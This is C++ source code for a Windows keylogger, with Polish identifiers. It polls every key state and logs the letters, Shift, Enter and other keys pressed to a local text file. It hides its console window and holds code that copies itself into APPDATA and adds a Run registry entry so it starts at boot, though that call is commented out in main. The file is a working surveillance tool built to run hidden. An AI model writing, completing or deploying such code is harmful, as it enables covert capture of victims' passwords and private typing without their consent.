#include <cstring>
#include <fstream>
#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <cstring>

using namespace std;

BYTE keys[256] = {0};
const string SCIEZKA_W_SYSTEMIE = getenv("APPDATA")+string("\\KeyloggerLive.exe");

bool scankeys(PBYTE keys, int num=-1)
{
    if(num>0)
        keys[num]=GetAsyncKeyState(num);
    else
        for(int i=0; i<256; i++) keys[i]=GetAsyncKeyState(i);
    return true;
}

void znaki()
{
    string cos1;
    string const nazwaPliku("C:/Users/luks1/cos.txt");
    ofstream mojStrumien(nazwaPliku.c_str());


    int i;
    while (!keys[27])
    {
        scankeys(keys);
        for (int i = 0; i < 256; i++)
            if (keys[i])

                switch( i )
                {
                case 65:
                    cout <<"a";

                    if(mojStrumien)
                    {
                        mojStrumien << "a" << endl;

                    }

                    break;

                case 66:
                    cout <<"b";
                    if(mojStrumien)
                    {
                        mojStrumien << "b" << endl;

                    }
                    break;

                case 67:
                    cout <<"c";
                    if(mojStrumien)
                    {
                        mojStrumien << "c" << endl;

                    }
                    break;
                case 68:
                    cout <<"d";
                     if(mojStrumien)
                    {
                        mojStrumien << "d" << endl;

                    }
                    break;
                case 69:
                    cout <<"e";
                     if(mojStrumien)
                    {
                        mojStrumien << "e" << endl;

                    }
                    break;

                case 70:
                    cout <<"f";
                     if(mojStrumien)
                    {
                        mojStrumien << "f" << endl;

                    }
                    break;

                case 71:
                    cout <<"g";
                     if(mojStrumien)
                    {
                        mojStrumien << "g" << endl;

                    }

                    break;
                case 72:
                    cout <<"h";
                     if(mojStrumien)
                    {
                        mojStrumien << "h" << endl;

                    }
                    break;
                case 73:
                    cout <<"i";
                     if(mojStrumien)
                    {
                        mojStrumien << "i" << endl;

                    }
                    break;

                case 74:
                    cout <<"j";
                     if(mojStrumien)
                    {
                        mojStrumien << "j" << endl;

                    }
                    break;

                case 75:
                    cout <<"k";
                     if(mojStrumien)
                    {
                        mojStrumien << "k" << endl;

                    }
                    break;
                case 76:
                    cout <<"l";
                     if(mojStrumien)
                    {
                        mojStrumien << "l" << endl;

                    }
                    break;
                case 77:
                    cout <<"m";
                     if(mojStrumien)
                    {
                        mojStrumien << "m" << endl;

                    }
                    break;

                case 78:
                    cout <<"n";
                     if(mojStrumien)
                    {
                        mojStrumien << "n" << endl;

                    }
                    break;

                case 79:
                    cout <<"o";
                     if(mojStrumien)
                    {
                        mojStrumien << "o" << endl;

                    }
                    break;
                case 80:
                    cout <<"p";
                     if(mojStrumien)
                    {
                        mojStrumien << "p" << endl;

                    }
                    break;

                case 81:
                    cout <<"q";
                     if(mojStrumien)
                    {
                        mojStrumien << "q" << endl;

                    }
                    break;
                case 82:
                    cout <<"r";
                     if(mojStrumien)
                    {
                        mojStrumien << "r" << endl;

                    }
                    break;

                case 83:
                    cout <<"s";
                     if(mojStrumien)
                    {
                        mojStrumien << "s" << endl;

                    }
                    break;

                case 84:
                    cout <<"t";
                     if(mojStrumien)
                    {
                        mojStrumien << "t" << endl;

                    }
                    break;
                case 85:
                    cout <<"u";
                     if(mojStrumien)
                    {
                        mojStrumien << "u" << endl;

                    }
                    break;


                case 86:
                    cout <<"v";
                     if(mojStrumien)
                    {
                        mojStrumien << "v" << endl;

                    }
                    break;
                case 87:
                    cout <<"w";
                     if(mojStrumien)
                    {
                        mojStrumien << "w" << endl;

                    }
                    break;

                case 88:
                    cout <<"x";
                     if(mojStrumien)
                    {
                        mojStrumien << "x" << endl;

                    }
                    break;

                case 89:
                    cout <<"y";
                     if(mojStrumien)
                    {
                        mojStrumien << "y" << endl;

                    }
                    break;
                case 90:
                    cout <<"z";
                     if(mojStrumien)
                    {
                        mojStrumien << "z" << endl;

                    }
                    break;


                //TAKIE TAM ZNAKI SPECJALNE//

                case 15:
                    cout <<" *Shift* ";
                     if(mojStrumien)
                    {
                        mojStrumien << "*Shift*"  << endl;

                    }
                    break;
                case 16:
                    cout <<" *Shift* ";
                     if(mojStrumien)
                    {
                        mojStrumien << "*Shift*" << endl;

                    }
                    break;
                case 32:
                    cout <<" *SPACE* ";
                     if(mojStrumien)
                    {
                        mojStrumien << "*SPACE*" << endl;

                    }
                    break;

                case 27:
                    cout <<" *ESC* ";
                     if(mojStrumien)
                    {
                        mojStrumien << "*ESC*" << endl;

                    }
                    break;

                case 18:
                    cout <<" *ALT* ";
                     if(mojStrumien)
                    {
                        mojStrumien << "*ALT*" << endl;

                    }
                    break;
                case 13:
                    cout <<" *ENTER* ";
                     if(mojStrumien)
                    {
                        mojStrumien << "*ENTER*" << endl;

                    }
                    break;
                case 8:
                    cout <<" *BACK* ";
                     if(mojStrumien)
                    {
                        mojStrumien << "*BACK*" << endl;

                    }
                    break;

                case 20:
                    cout <<" *CAPS LOCK* ";
                     if(mojStrumien)
                    {
                        mojStrumien << "*CAPS LOCK*" << endl;

                    }
                    break;

                }

        Sleep(20);
    }


}






void kopiujDoSystemu(string sciezka)
{
    string komenda = "copy "+sciezka+" "+SCIEZKA_W_SYSTEMIE;
    system(komenda.c_str());
}




bool aKopiowanie()
{
    CreateMutex(NULL, TRUE, "5da64e2b2ed82f3ac144d1a87f78b16ahakeredupl");
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        return true;
    }
    else
    {
        return false;
    }
}





void ukryjKonsole()
{
    FreeConsole();

}





void dodajDoAutostartu(string sciezka)
{
    string komenda = "reg ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v keylogger /f /t REG_SZ /d ";
    komenda.append(SCIEZKA_W_SYSTEMIE);
    cout << komenda << endl;
    system(komenda.c_str());

    kopiujDoSystemu(sciezka);

    if (sciezka!=SCIEZKA_W_SYSTEMIE)
    {
        string komenda = "start ";
        komenda.append(SCIEZKA_W_SYSTEMIE);
        system(komenda.c_str());
        exit(EXIT_SUCCESS);
    }

}


int main()
{
     ukryjKonsole();

    if(!aKopiowanie())
    {

        Sleep(3000);

         //dodajDoAutostartu(argv[0]);
         znaki();

    }
    return 0;
}
